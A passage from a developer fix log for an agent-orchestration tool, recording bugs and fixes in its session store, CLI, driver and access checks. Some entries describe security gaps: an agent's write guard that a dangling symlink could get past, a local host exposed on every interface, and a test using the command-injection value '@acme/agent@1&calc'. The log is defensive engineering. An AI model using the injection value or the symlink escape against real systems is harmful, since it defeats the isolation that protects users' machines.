opens the same file, so the driver's tick and a person's chat, or two connectors, could both read
"free" and both write. That puts two agents in one working tree. Moving a session had the same shape:
the driver's conclusion and a person's stop could both read it active, and the second write moved a
session that had already finished.

**Root cause.** Check-then-act with nothing holding the file between the check and the act.

**Fix.** `SessionStore.ExclusiveAsync` runs a check and the write it decides inside one
`BEGIN IMMEDIATE` transaction. That takes the file's write lock before the read, so a second host
waits, then reads what the first wrote. The connection's gate does the same within a host, and the
body gets an uncancellable token (see the entry below on transactions). The three opens, and
`AdvanceAsync`, go through it.

**Verify.** `An_open_waits_for_another_host_s_open_and_then_finds_the_tree_taken` uses two
connections to one file: one holds the write lock with an uncommitted session on the tree while the
other opens a chat there. Before the fix the open answered `None` and made a second session. Now it
waits and answers `RepositoryBusy`. Service 497/497.

## Two publishes on one ask kept one quest (2026-09-25)

**Symptom.** Found by REV3's reading of the service. An ask becomes quests from two processes: the
intake session's connector, and the person's page through the desktop's host. Each publish read the
ask, added its quest to the list it had read, and saved the whole record. Two at once kept only the
second quest. A close, and an intake recording itself on the ask, were written whole the same way,
so either could drop a quest published between their read and their write.

**Root cause.** Read-modify-write on a record that more than one process writes. An in-process lock
would not have helped.

**Fix.** Each change writes only what it owns, in one statement, which SQLite makes atomic across
processes. `RecordPublishedAsync` appends the quest where the list is kept, unless it is already
there, and leaves a closed ask closed. `RecordClosedAsync` and `RecordIntakeAsync` set their own
columns.

**Verify.** `A_publish_appends_to_what_the_ask_holds_and_a_close_keeps_it` pins the store operations.
Two publishers each record their quest without seeing the other's, a repeat is kept once, and a
close keeps every quest. It did not fail first, because the operations did not exist. The race itself
cannot be timed from outside; what the test shows is that no publish writes from a copy anymore.
Service 496/496.

## Half a conflict's name dismissed every conflict (2026-09-25)

**Symptom.** Found by REV3's reading of the service. A conflict is named by its machine and its
sequence, since sequences count per machine. A dismissal naming a sequence and no machine
(`{"sequence": 5}` on the HTTP door) fell into "names none", and dismissed every conflict the quest
carried, on every machine the next pass reached.

**Root cause.** The filter asked only whether a machine was named.

**Fix.** Naming neither is every conflict. A sequence without its machine names none, and the door
answers "carries no such conflict".

**Verify.** `Dismissing_names_one_conflict_or_every_one_the_quest_carries` gained the half-named
case, which dismissed 1 before the fix and dismisses 0 now. Service 495/495.

## JSON of the wrong shape crashed an import, or a whole refresh (2026-09-25)

**Symptom.** Found by REV3's reading of the service. A `daoris.json` that is valid JSON but not an
object (`[]`, a string) threw out of `RegistryImport`, and took the whole import down with it. A
`daoris.lock` whose entries are numbers, or whose `target` is not a string, threw out of
`DaorisLock.Read`, which the index calls for every repository — so one odd lock failed the refresh
for all of them. Both readers promise the opposite: a broken file is that repository's problem.

**Root cause.** Both caught `JsonException` only. `JsonElement`'s reads throw
`InvalidOperationException` when the value is the wrong kind, and that was never caught.

**Fix.** Both catch the two exceptions together, so a file of the wrong shape is handled like a
file that will not parse.

**Verify.** `A_manifest_of_the_wrong_shape_is_still_adopted` and
`A_lock_of_the_wrong_shape_reads_as_everything_local`: five of their six cases failed before the fix.
Service 495/495.

## A mistyped kind widened a search, and a repository filter depended on case (2026-09-25)

**Symptom.** Found by REV3's reading of the service.
- `kinds=decison` (or any name that is no kind) parsed to no kinds. No kinds means every kind, so
  the typo widened the search it meant to narrow, on search and convergence, over HTTP and MCP.
- `repositories=Alpha` found nothing in the SQLite search, and found `alpha` in the in-memory search.
  The parsed set compares `OrdinalIgnoreCase`, and the SQL compared `BINARY`.

**Root cause.** `ParseKinds` skipped what it could not parse. The repository filter was the one
comparison in the query without `COLLATE NOCASE`; the workspace filter beside it has it.

**Fix.** An unknown kind is refused naming the ones there are. The HTTP doors answer 400 with the
sentence, and the MCP tools return it. The repository filter compares `NOCASE`.

**Verify.** `A_mistyped_kind_is_refused_rather_than_widening_the_search` and
`The_repository_filter_ignores_case_like_every_other_door` both failed first. Service 489/489.

## A re-wire that named no workspace moved the row to `default` (2026-09-25)

**Symptom.** Found by REV3's reading of the service. `POST /api/registry/{repository}/workspace`
with an empty `workspace` passed the shared host's boundary check, where silence means "the host's
own circle". It then normalized to `default`. On a deployment serving `aurora`, the row moved out of
the one circle the host serves.

**Root cause.** The re-wire door reused the registration door's refusal, and its rule for silence.
Silence suits a registration. A re-wire exists only to name a workspace.

**Fix.** `Access.RefuseRewire` refuses a re-wire that names none, on any host, then applies the
registration door's boundary. The route asks it.

**Verify.** `A_rewire_that_names_no_workspace_is_refused` and `A_rewire_keeps_the_registration_door_s_boundary`
in `AccessTests`. The route itself is not unit-tested: the service suite never starts the HTTP host,
which is REV3's service F19 and a backlog row.

## A request that went away mid-transaction could roll back somebody else's write (2026-09-25)

**Symptom.** Found by REV3's reading of the service. A host holds one SQLite connection for every
store. A statement another request runs while a quest transaction is open joins that transaction
rather than failing. `InTransactionAsync` already knew this, and commits even a refusal for that
reason. But every statement inside the transaction ran on the request's own token. A client that went
away mid-take threw `OperationCanceledException` halfway, and the rollback that followed took the
joined writes with it: a session record, a registration, an ask.

**Root cause.** The body's cancellation was the caller's. It was captured by nine lambdas, and by the
index's replace.

**Fix.** Once `BEGIN` has run, the work is handed `CancellationToken.None` as a parameter, so no body
can capture the caller's token, and the commit uses none either. Waiting for the connection's gate
still honours the caller. The index's `ReplaceRepositoryAsync` follows the same rule.

**Verify.** No test: a cancellation landing between two statements of a live transaction cannot be
timed from outside, and the transaction helper is private. The change is mechanical. The build proves
no body still names the caller's token, and service 483/483 proves nothing else moved. Stated here so
nobody reads the suite as having tested it.

## A schema bump emptied a shared index until every repository committed again (2026-09-25)

**Symptom.** Found by REV3's reading of the service. A build that bumps the index schema rebuilds it
on open: the entries go, and the store's own remarks promise a shared deployment is "re-fed whole by
each desktop's next sync tick". The next feed arrived at the same commit, was judged *already held*,
and was answered as accepted with nothing stored. The deployment searched an empty index until each
repository's next commit.

**Root cause.** The claim and the thing claimed live in two stores. The rebuild dropped
`entries`, and `feed_provenance` in the registration store kept saying which commit they came from.

**Fix.** The knowledge store says when opening it rebuilt an index an older schema wrote (`Rebuilt`),
and the composer then forgets every repository's knowledge provenance. Code maps and declarations
keep theirs, because they hold their bodies in the registration store and survive the rebuild.

**Verify.** `A_rebuilt_index_takes_the_same_commit_again` feeds a commit, sets the file's
`user_version` back as an older build would have left it, reopens, and feeds the same commit. It
failed with an empty summary, and passes. Service 483/483.

## A session's connector answered from the registry it loaded at spawn (2026-09-25)

**Symptom.** Found by REV3's reading of the service. Every host on a machine opens one store: the
desktop's HTTP host, and a `daoris-knowledge` connector per agent session. Each loaded the registry
into memory once, when it started. So a repository retired from the desktop stayed addressable and
indexed in every session already running, one added was unknown there, and that session's refresh
swept the newcomer's entries out of the shared index.

**Root cause.** `Registry` was a copy of the `registrations` table, loaded by `ServiceFactory` and
then maintained only by the process's own writes. D48 §3 made the store the authority, and the copy
was never told.

**Fix.** `KnowledgeService` re-reads the table into the registry before every answer that reads it:
the registry query, a refresh, and the code map. The swap is whole (`Registry.Replace`), so a
concurrent reader never sees half a reload.

**Verify.** `A_second_host_over_the_same_store_sees_what_the_first_retired_and_added` failed with
`["engine", "game"]` where `["engine", "newcomer"]` was due, and passes. Service 482/482.

## `status` hid what `check` fails on, and a pack's switch could take out a whole tier (2026-09-25)

**Symptom.** Found by REV3's reading of the CLI.
- **`status`** printed drifted, missing and stale packs. It said nothing of the other two facts `check`
  fails on: a switch the manifest confirmed and `sync` never applied, and a roster behind the disk.
  So the command a person runs to learn why `check` is red was silent about two of its five reasons,
  in text and in `--json`. With no Daoris home, `status --machine` printed `machine null`.
- **`switchesOff`** matched its key as a prefix. A pack declaring `"rules": "…"` took every core rule
  out once confirmed. `"skills/fix-log/template.md"` took one file of a skill, and its `SKILL.md` stayed.

**Root cause.** `status` rendered `inspect`'s fields one by one and was never updated when
`staleSwitches` and `indexStale` joined them. The switch check asked "does this key cover some core
file", when D71's question is "is this key a row".

**Fix.** `status` renders both facts, and `--json` carries them. The machine line names
`DAORIS_HOME` when there is none. A switch key must be `rules/<name>.md` or `knowledge/<name>.md`
naming a core document, or `skills/<name>` naming a core skill, or the canon is refused naming it.

**Verify.** Each new test was watched failing first: `status names what check would fail on`, `status
--machine with no Daoris home says what to set`, and `a switch names one document or one whole skill`.
CLI suite green.

## A flag before the operands became one, and `agent list` promised a fallback the driver refuses (2026-09-25)

**Symptom.** Found by REV3's reading of the CLI.
- **The operand.** `daoris agent pin --workspace aurora claude-code 2.1.87` answered *"`aurora` is not
  a Claude Code version"*. The same order in `profile default --workspace …` read `--workspace` as
  the agent.
- **The sentence.** `agent list` said a pin nobody installed was *"NOT INSTALLED, so sessions fall back
  to PATH"*. The driver refuses to start a session on it and says why, which is D57's rule.

**Root cause.** Five commands scanned `argv` their own way. `agent` asked for "the token at index 2,
or the first bare one after it", which is the flag's value when the flag comes first. `driver retry
--at` had been fixed the same way on its own that morning (`d7ef48d`). The list's sentence was written
before the driver's refusal and never revisited.

**Fix.** One parser, `operands(argv, valued)` in `args.ts`, where each command names the flags that
take a value. `agent`, `remote`, `driver`, `agent rules`, `retire` and `import` read their operands
through it (REV3 CLI C2). The list says the driver refuses.

**Verify.** `a flag before the operands is not an operand` failed with the `aurora` sentence above,
and passes. `args.test.ts` holds the helper both ways round. The pin test in `list says which version
is pinned` failed on the old sentence. CLI 468/468.

## A refused turn never ended, and an unknown block vanished from the record (2026-09-25)

**Symptom.** Found by REV3's reading of both halves of the conversation.
- **A refused turn.** On the protocol door, a `session/prompt` answered with a JSON-RPC error (auth
  expired, overloaded) left the record with the person's message and a note, and no turn's end. The
  page draws *working…* until a turn event closes the turn, so it showed working under the driver's
  own failure note. The composer beside it, told by the queue that nothing was running, offered
  *send*.
- **An unknown block.** On Claude Code's native door, a message block of a type the mapper had no case
  for (`redacted_thinking`, `server_tool_use`, `image`) became no line and no event. `SessionEvents`
  promises "kept, never dropped", and the protocol door keeps its unknowns raw.

**Root cause.** The refusal's catch recorded the note and forgot the turn. The block switch had no
default.

**Fix.** A refused turn records a turn event with stop reason `error`, which the page reads as "the
turn ended: error". An unknown block is kept as a raw event under its own type.

**Verify.** Both tests were watched failing before the fix.
- `A_turn_the_agent_refused_ends_in_the_record_and_the_next_one_is_taken`. The failing run's record
  read user, note, user, message, end, with the first turn never ended.
- `A_block_this_build_has_no_kind_for_is_kept_raw_under_its_own_name`.

Driver 665/665.

## A local host could bind every interface through Kestrel's own configuration (2026-09-25)

**Symptom.** Found by REV3's reading, then shown on the real host. A local-mode host refuses to bind
beyond loopback (D21, D47 §3), and it judged that from `urls`. `Kestrel__Endpoints__Http__Url=http://0.0.0.0:5177`
was set as an environment variable (an argument or a content-root `appsettings.json` works the same).
`urls` stayed at its loopback default, so the judgement passed. Kestrel then logged "Overriding
address(es)…" and bound every interface, with loopback trust: no key, and roots, transcripts and
profiles served to anything that reached the port. The code's own comment claimed "the RESOLVED value
is what both the startup judgement below and the bind itself use".

**Root cause.** Kestrel's endpoint section overrides `UseUrls` at bind time, and the judgement read
only the urls.

**Fix.** `Access.RefuseStartup` also takes the configured endpoints' URLs and judges them by the same
loopback rule.

**Verify.** `Local_mode_refuses_a_kestrel_endpoint_beyond_loopback_whatever_the_urls_say`. The built
host was also started in local mode with that variable set, and it refused with the D21 sentence
before binding anything.

## A remote address with no scheme threw past the remote's own wall (2026-09-25)

**Symptom.** Found by REV3's reading, then reproduced. `daoris remote add team --url team.example.com:5177`
was accepted, and so was the same form in `DAORIS_REMOTE_URL`. Every request to it threw. An address
like that parses as the *scheme* `team.example.com` (`NotSupportedException`), and `203.0.113.5:5177`
parses as relative (`InvalidOperationException`). Neither was in `SendAsync`'s list of three caught
types, and `QuestSync` catches only `RemoteException`. So `/api/sync` answered a bare 500 with no wall
on the status bar. A take on a shared quest committed locally and then threw, and a retried take then
stood down on its own claim.

**Root cause.** The catch named the failures someone had seen. The address was validated nowhere.

**Fix.** `HttpRemote.SendAsync` turns every failure except the caller's own cancellation into the
remote's wall, never naming the key. `remote add` refuses an address that is not http(s).

**Verify.** `An_address_with_no_scheme_is_the_remote_s_wall_not_a_crash` covers both shapes, which
failed with exactly those two exception types. `an address with no scheme is refused before it is
wired` checks that nothing was written. Service passes 480/480.

🔴 **The first version of this fix broke the sensitive gate.** It used a private LAN address as its
example of the second shape, in this entry and in the test. The gate caught it on the next `verify`.
The address is now `203.0.113.5`, from the range RFC 5737 reserves for documentation. It still has
no scheme, and it fails the same way.

## One repeated heading failed the whole refresh, one failing embedder failed convergence, and the registry was not safe to share (2026-09-25)

**Symptom.** Found by REV3's reading of the service.
- **A repeated heading.** Two sections under one heading in a registered repository's fix log,
  decisions or archive gave both entries one id. Date-only fix headings do exactly this. SQLite's
  primary key threw on the second, so `RefreshAsync` failed for every repository sorted after that one,
  and on an empty store every door that ensures the index kept failing.
- **A failing embedder.** A configured embedder that failed (the endpoint down, or started without
  embeddings) threw out of convergence. The copies and restatements already found were thrown away,
  and the landing view answered 500.
- **Shared dictionaries.** `Registry._known` and the convergence memo were plain dictionaries under
  concurrent requests, so a registration inserted during any read answered 500 with "collection was
  modified".

**Root cause.**
- The log scanner anchored on the heading alone. The tests ran on the in-memory store, which accepts
  duplicate ids.
- The semantic pass had no catch. `Embedding.cs` promises the opposite ("the lexical half carries
  on").
- Nothing guarded the two dictionaries.

**Fix.** A repeated heading's section gets its own anchor (`(2)`, `(3)`), and the first keeps the id
it always had. A failing semantic pass costs the semantic half only. Both dictionaries are concurrent.

**Verify.** Both tests were watched failing before the fix:
- `Two_sections_under_one_heading_are_two_entries_with_two_ids`.
- `An_embedder_that_fails_costs_the_semantic_half_and_nothing_else`. Its first draft passed without
  the fix, because the identical pass claimed both entries and the embedder was never reached. A test
  that could not fail. Two unpaired entries make it reach the embedder.

Service 478/478. **Not covered by a test:** the concurrency. It rests on the collection types.

## The release workflow could not pass on a fresh runner, and its gate-list test read comments (2026-09-25)

**Symptom.** Found by REV3's reading. The workflow has never been dispatched, and five things in it
would have failed or lied:
- **F1: nothing installed.** The `release` job never ran `npm ci` at the root, so `verify` (which opens
  with `tsc --noEmit`) and `Pack` (whose prepack compiles) could not pass.
- **F2: the bump broke the rehearsal.** `release-prep` bumps the canon version before the gates.
  Every provenance header and lock carries that version, so the family rehearsal's first check
  ("sync changed nothing tracked") would go red on every release that moves it.
- **F3: files left out of the commit.** The release commit named its files by hand and missed the
  example manifests `release-prep` pins, so `verify` would be red on main right after a release.
- **F4: no publish directory.** `npm pack --pack-destination ../../publish` wrote into a directory
  nothing had made.
- **F5: the gate-list test read comments.** It matched the whole workflow's text. With the Verify step
  deleted it stayed green, because a comment elsewhere said `npm run verify`.

Separately, the sensitive gate's Windows home pattern held only the single-backslash spelling. The
spelling used in JSON, JS and C# literals passed, and `daoris.gates.json` itself carried one. Widening
the pattern then caught **this review's own commit `2b10cb7`**, whose new test wrote a home-shaped
path as a literal: the universal gate had been red since. That is the reason to run the gates after
every landing, not only at the end.

**Fix.**
- The job installs the root workspace.
- A step re-syncs this repository and both examples at the new version.
- The commit stages tracked files under exactly the places `release-prep` and the re-sync write.
- Pack makes its destination.
- The gate-list test reads only non-comment lines, and refuses `continue-on-error: true` and
  `|| true`.
- The Windows pattern takes one or two backslashes or a forward slash (the CLI's canon scan is its
  twin). The placeholders it now catches are assembled at run time or reworded.

**Verify.**
- The gate-list test was watched red against a workflow with the Verify step removed (the removal
  confirmed applied), then green on restore.
- `A_windows_home_is_caught_however_its_separator_is_spelled` covers all three spellings.
- The universal gates pass on the sensitive scan.
- **Not covered:** the workflow itself. It can only be proven by a dispatch, which is the owner's.

## A console lost its backlog, and a refresh said less than the service did while wiping what the tick wrote (2026-09-25)

**Symptom.** Found by REV3's reading of the page.
- **The console's backlog.** A running session's console asked for its backlog and received live
  batches over the same bridge. When a batch (sequence 250) arrived before the backlog's answer, lines
  1 to 249 were never shown, and the `dropped` footer said nothing.
- **A session switch.** A gap-fill answered after a session switch appended session A's lines to B's
  console.
- **Refresh index, what it says.** The service's report names a registered repository whose checkout
  is not where the registry says. The toast read only the count.
- **Refresh index, what it wipes.** It invalidated every query, the tick-written answers included.
  Their "fetch" is an empty list, so every refresh wiped *why a quest is sitting* and the trust holds
  until the next tick, and ran git again for an open review.

**Root cause.** The console filtered each source by "newer than the newest held", and `take` checked
no session. The refresh used `invalidateQueries()` with no filter, and its success handler read two of
the report's fields.

**Fix.** The console merges lines by sequence, whichever source lands first, as the conversation's
`mergeEvents` already does. A gap-fill is taken only for the session still attended. The refresh
invalidates only what the index feeds, and names an absent checkout as an error, in both catalogues.

**Verify.** Every test named here was watched failing before its fix.
- `keeps the backlog when a live batch lands before it`.
- `never shows one session's lines on another's console`.
- `a refresh asks again what the index feeds, and leaves what the tick wrote alone`.
- `a refresh that could not find a registered checkout says which`. Pressing it with `userEvent`
  opened the button's tooltip, which outlived the render and broke the scope test after it, so it
  presses with `fireEvent`.

## The terminal's conversation: Ctrl+C left it `working`, an unreadable attach ended it, and plugin servers never reached it (2026-09-25)

**Symptom.** Found by REV3's reading of the conversation's two doors.
- **Ctrl+C at rest.** Pressing Ctrl+C at the terminal's prompt, with no turn running, let the runtime
  terminate. No `finally` ran and no runner was disposed. The harness exited on end of input, and the
  record stayed `working`, holding the repository, with no terminal verb that could end it.
- **Attaching a file.** `:attach` of a locked, unreadable or 1 GB file threw out of the read loop, so
  disposing the runner stopped the whole conversation. A huge file was read into memory before the
  20 MB limit refused it.
- **No catch at the door.** A missing home or an unreachable service was a stack trace, not the door's
  own exit 2.
- **Plugin servers.** A conversation on Claude Code's own door was handed no plugin servers, while
  driven, intake and protocol-door sessions all were ("servers every session is handed", D64).

**Root cause.** The terminal door's interrupt handler returned early at rest. Its read loop waited on
stdin alone, and `ChatConsole.RunAsync` sat outside the host's catch. `ChatRunner` wrote the servers
file only on the protocol door's path. The pipe half was written for driven and intake spawns, and the
chat path never got it.

**Fix.**
- Ctrl+C at rest is the person's stop: it ends the conversation `stopped`, on the record. The read loop
  races stdin against the conversation's end, so either one ends the loop.
- `:attach` judges the size first, and a file that will not read is a line saying so.
- The door carries its sibling consoles' `DriverException`/`HttpRequestException` → exit 2.
- A chat on the pipe door is handed the plugins' servers file, and it is removed when the conversation
  goes.

**Verify.** `A_conversation_on_the_native_door_is_handed_the_plugins_servers` failed before the fix: a
stand-in Claude Code records its argv, and the test finds `--mcp-config` naming the plugin's server.
The family rehearsal passes 279/279, and it drives this door's scripted conversation. **Not covered
by a test:** Ctrl+C at an idle prompt, and `:attach` of an unreadable file. Both are the terminal's
interactive half, and neither has a harness yet.

## Every closed monitor or detached window kept buffering the whole bus (2026-09-25)

**Symptom.** Found by REV3's reading, against the Shenora source. Opening and closing a monitor window
or a detached session left that window's IPC bridge subscribed to the whole event bus. The bridge's
flush timer ran on the closed window's thread, which had ended, so every later event was queued
until its 10,000 cap and held there for the life of the process. That includes the sessions' console
lines and conversation events. It happened once for every window the person ever opened.

**Root cause.** `SecondaryForm` unhooked its theme handler on close and never disposed its
`WebViewIpcBridge`. The package says to "dispose with the owning window".

**Fix.** `OnFormClosed` disposes the bridge.

**Verify.** Build only. The App project has no tests, because it is the WinForms half that D46 keeps
thin. **Not covered by a test:** the disposal itself. The next look at an installed shell with a
monitor opened and closed is where it is seen.

## A second Sign in took the first one's place, and the first could no longer be answered (2026-09-25)

**Symptom.** Found by REV3's reading of both halves. `HARNESS_ACTION` answers `started` as soon as the
process starts, and the page gated every button on the request alone. So *Sign in* was enabled again
while the first login still waited on a browser. A second press, a common reaction to "Opening browser…"
with nothing visible, had three effects:
- The host's `_actions["claude-code:login"]` was overwritten, so the first process could no longer be
  answered or stopped.
- When the first ended, its `finally` removed the second's entry, and a code pasted into the second
  was refused as "nothing is running".
- On the page, the first's `HARNESS_ENDED` matched the running key and closed the second's panel.

"One at a time by construction" was a comment on both sides, and nothing enforced it.

**Root cause.** The host keyed running actions by name with no claim. The page's "running" lasted as
long as the request, not the action.

**Fix.** The host holds one slot on this machine. It is claimed atomically as an action starts, after
everything that could throw first, and `RunActionAsync` releases it however the action ends. A second
start is refused with a new catalogued code, `HARNESS_ACTION_BUSY`, naming what runs. The page holds
`inFlight` from `started` until that action's `HARNESS_ENDED`, and the roster's buttons are disabled
on it.

**Verify.** `A_second_harness_action_while_one_runs_is_refused_and_the_first_stays_answerable` was
watched failing. Its second press is refused naming `claude-code:login`, the first is still answered,
and the slot frees at its end. The catalogue test holds the new code in both languages. **Not covered
by a test:** the page's button gating. It was checked by reading, and the host's refusal is what
holds the line if it regresses.

## A plugin answering the hook wire in the wrong shape killed every tick, naming nobody (2026-09-25)

**Symptom.** Found by REV3's reading. Several answers from a plugin's hook process made the driver
throw `InvalidOperationException` ("Operation is not valid due to the current state of the
object"):
- `initialize` answered with `null`, a string, or `"protocolVersion":"1"`;
- `hook/quest/consider` answered with `{"kind":5}`;
- a JSON-RPC `error` that was not an object.

That exception is not a `DriverException`, so it escaped the reconcile's catch and the tick. Reconcile
retries every tick, so the driver did nothing else, and no sentence said which plugin to disable. The
plugin design promises "The person reads the sentence and disables the plugin; the driver never
stops."

**Root cause.** `HookPeer` read properties without checking each element's kind first. `TryGetProperty`
on a non-object, `TryGetInt32` on a non-number and `GetString` on a non-string all throw rather than
answer false.

**Fix.** Every read checks the element's kind first. A wrong shape is a `DriverException` naming the
plugin and what it answered, "(no result)" when it answered nothing. A hold whose reason is not words
reads "no reason given", as an absent one already did.

**Verify.** `An_answer_of_the_wrong_shape_is_a_sentence_naming_the_plugin` covers seven shapes, and
four of them failed before the fix. `An_error_of_the_wrong_shape_is_still_the_plugin_s_refusal` covers
the error frame. All 22 hook tests pass.

## A typo in `driver.json` stopped the driver: a torn file killed the loop, an unknown adapter every tick (2026-09-25)

**Symptom.** Found by REV3's reading. A hand edit of `driver.json` that left a trailing comma, or a
number like `"pollSeconds": 1.5`, threw from the loop's config load. That load sat outside its catch,
so the watch died on the first tick, and in the shell no `DRIVER_ERROR` said so. A sibling file
promises "a hand-mangled file must never be what stops a driver coming up". An adapter name the roster
did not know, such as `claude_code`, threw from the harness selection out of the whole tick, every
tick. That lost the report's holds and considerations, and the intake's twin already held on the same
sentence.

**Root cause.** The load was the loop's first statement, outside the `try` that carries every other
failure to `onError`. The quest path called `SelectAsync` bare, where the intake path wrapped it.

**Fix.** The loop loads the config inside its catch. A file that will not read becomes the driver's
own sentence. Nothing ticks on choices it cannot read, the wait keeps the last pace that read, and the
next look after a fix ticks. The quest path holds on the selection's `DriverException`, as the intake
does.

**Verify.** Both tests were watched failing before the fix.
- `A_torn_driver_json_is_said_and_watched_never_the_end_of_the_loop` tears the file, receives one
  `DriverException` naming it, fixes the file in the error handler, and gets the tick.
- `An_adapter_nobody_knows_holds_the_quest_and_the_tick_still_reports`.

## A repository's deny rules missed its session when its name was spelled in another case (2026-09-25)

**Symptom.** Found by REV3's reading. The person added `deny Bash(rm:*)` for repository `Engine`, the
spelling its registry row uses. An agent published a quest `to: "engine"`. Publishing and the planner
both match names case-insensitively, so the session started, but it was handed none of `Engine`'s
rules. That is a widening nobody chose. Workspace scopes behaved the same way. An edit in another
case also opened a second scope beside the first.

**Root cause.** Every layer that names a repository or a workspace compares the way a person does,
trimmed and case-insensitive, except the permission scopes. They were an `Ordinal` dictionary, looked
up by the quest's `to` exactly as the agent typed it.

**Fix.** `Compose` takes every scope whose name matches in any case, so a file holding both spellings
loses no rule from either. An edit reuses the spelling the scope already has. The CLI's `edit` and
`composeRules` do the same, since the file is the contract between the two.

**Verify.** `A_scope_named_in_another_case_still_reaches_its_session_and_an_edit_keeps_one_scope` was
watched failing before the fix. The permission suites pass on both sides, and the CLI passes 461/461.

## The tree guard let a write through a link to somewhere that did not exist yet (2026-09-25)

**Symptom.** Found by REV3's reading, then shown by probe and a test. A junction or symlink inside a
session's tree pointed outside it, at a path that did not exist yet. A `Write` through that link was
judged inside the tree, and the write created its target outside. Any absent file a link pointed at
was writable this way, a missing config file under the Daoris home included. The guard's own header
promises "a write through a link inside the tree that leads out of it is outside".

**Root cause.** `resolveThroughLinks` walks up to the deepest ancestor that resolves. A dangling link
fails `realpath` exactly as a missing file does, so the walk treated it as a plain name, put it back
onto the tree's path, and judged the result inside. The existing link test used a link whose target
existed.

**Fix.** A component that will not resolve is asked whether it is a link (`lstat`). If it is, it is
followed through `readlink` and the walk continues from there. More than 40 links is an error, and
the hook now fails closed on any resolution error: it denies rather than lets the write through.

**Verify.** `A_write_through_a_link_to_somewhere_that_does_not_exist_yet_is_denied` makes a junction
to an absent folder outside the tree and asserts both preconditions (the link exists, its target does
not). It failed before the fix. All 11 tree-guard tests pass.

## The desktop's Install never started on Windows — the CLI's 2026-09-22 fix had a twin (2026-09-25)

**Symptom.** Found by REV3's reading of the modules, then reproduced. On Windows, pressing *Install* on
any agent, or pinning one that ships only on npm (`claude-code-acp`, `dsh`, `codex-acp`), failed
before it started. The page showed the generic "something on this machine refused". The CLI's
`daoris agent install` had exactly this defect until 2026-09-22 ("`daoris harness install` has never
worked on Windows", below), and that fix went into the TypeScript only.

**Root cause.** Every declared installer is `npm …`, and on Windows `npm` is `npm.cmd`.
`HarnessActions.RunAsync` started `FileName = "npm"` with no shell. `CreateProcess` appends only
`.exe` and found nothing. The resulting `Win32Exception` was not a `DriverException`, so the module
boundary flattened it to a type name, and its own message named the working directory.

**Fix.** On Windows, the command is resolved through `PATHEXT` to the shim it names. This skips the
extensionless POSIX `npm` script npm installs beside `npm.cmd`, which no Windows process can start.
An argument `cmd.exe` would reinterpret is refused rather than escaped, as the CLI does. A command
that cannot start becomes the driver's own sentence, with no path in it. `CommandPresence.Resolve` is
the one lookup behind both the presence check and the start.

**Verify.** Two new `HarnessRunTests`, both failing before the fix:
- `A_bare_command_that_is_a_windows_shim_starts` puts a `.cmd` on PATH, runs it by its bare name, and
  refuses `@acme/agent@1&calc`.
- `A_command_that_is_nowhere_is_refused_in_a_sentence` expects a `DriverException`, where before it
  got a raw `Win32Exception` carrying the test's working directory.

## A harness outlived its session when anything failed between its spawn and its wait (2026-09-25)

**Symptom.** Found by REV3's reading of both spawn paths, then reproduced. The trigger was any
failure after `Process.Start` and before the wait. The plainest case is a person pressing stop on a
session still `starting`. The stop finds no tracked process, so the orphan sweep ends the record
`stopped`. The spawn goes ahead anyway, and the move to `working` is then refused, because a
terminal record does not move. The catch concluded the record and returned. The agent kept working
the quest with no record, no marker and no stop that could reach it. The tree's lock was free again,
so the next tick could start a second session on the same open quest in the same tree. The driven,
intake and conversation spawns all had it. The first test run of this very defect left its stand-in
harness alive and holding the test runner's pipe, which is how the hang behind it was found.

Two related holes widened it:
- HttpClient's timeout is an `OperationCanceledException` with nobody having cancelled. Every catch
  that filtered on "not a cancellation" let it escape the tick, or left a conversation's record at
  `queued` where neither a stop nor the sweep reaches.
- The conversation's `Conclude` did not catch it either, so the terminal door waited forever on an
  `onEnded` that never came.

**Root cause.** Nothing owned the process between its start and its wait. Every exit path assumed
the wait had run, and the wait is what ends a process that should not live.

**Fix.** `SessionProcesses.EndIfRunning` is the reaper. Each spawn site holds it from the moment the
process is tracked: the driven and intake paths as a disposer declared after `tracked` so it runs
first, and the conversation's watch in its catch, while it is still tracked. On the ordinary path the
process has exited and the reaper does nothing. The failure catches now take everything but the
shutdown's own cancellation. Their terminal writes ride an unbound token and swallow any second
failure. A conversation cancelled by its caller before its process started is concluded and then
rethrown.

**Verify.** Both tests make the stand-in ledger refuse `working`, and have the stand-in harness beat
a file every 100 ms. Both were watched failing ("still beating"):
- `A_session_the_record_will_not_let_work_does_not_outlive_its_tick` (driven).
- `A_conversation_the_record_will_not_let_work_does_not_outlive_it` (conversation).

Driver suite 648/648.

## A shared deployment kept serving a retired repository's knowledge (2026-09-25)

**Symptom.** Found by REV3's reading. A joined, sharing repository fed its entries to the team's
deployment. Its machine then retired it, which SYNC5b carries as `DELETE /api/registry/{repo}`. The
deployment deleted the row but kept its entries, and `/api/search`, `/api/entry` and convergence
went on serving them to every keyed caller. The same happened when a repository stopped sharing
knowledge or unjoined, because the new declaration only flipped a flag. The retire answer promised
"its entries leave the index on the next refresh". A shared host never refreshes: it is fed, not
scanned.

**Root cause.** `RetireAsync` removed the registration and relied on the ghost rule to take the
entries. That rule runs only in a refresh, which only a host that reads its registered roots does. A
declaration that stopped sharing was never treated as taking anything back.

**Fix.** Retiring removes the repository's entries at once, on every kind of host. A fed declaration
that no longer joins and shares removes what it fed, and the commit that feed was held at goes with
it. Otherwise sharing again from that same commit would be "already held" into an empty index. The
retire sentence, its doc comments and the Projects page's retire text now say what happens.

**Verify.** Two tests in `FeedTests`, both watched failing without the fix:
- `Retiring_takes_the_repository_s_knowledge_out_of_the_index`.
- `A_declaration_that_stops_sharing_takes_its_knowledge_with_it`, which also re-shares and re-feeds
  from the old commit.

## A session's note carried its tree's path and its account's name off the machine (2026-09-25)

**Symptom.** Found by REV3's reading. Sessions must not carry a tree, a transcript or a profile off
the machine, and the wire enforces that by having no field for any of them (D47 §4, D49 §4, D51).
But the driver writes three kinds of free-text note:
- "opened a session tree at `<absolute path>`";
- "its provider refused the `claude-code` account `<profile>`";
- an exception's own words, which can name a file under the home.

SYNC4 pushed the note verbatim, so the team's deployment and every teammate's machine held the
path and the account name. The HTTP host also returned the note as-is to non-loopback callers.

**Root cause.** "A field that does not exist cannot be filled in by accident" holds for a field and
not for a sentence. The note was the one free-text field on the record, and nothing looked inside it.

**Fix.** `SessionNote.ForAnotherMachine` cleans a note wherever it leaves the machine: SessionSync's
push, and `ToSession` for any caller that is not local. It takes out the record's own tree and
transcript in either slash spelling, the profile as a whole word, and any other drive, UNC or
home-rooted path. It keeps what a teammate needs: branches, exit codes, the refusal's code. This
machine's own page still sees the note whole.

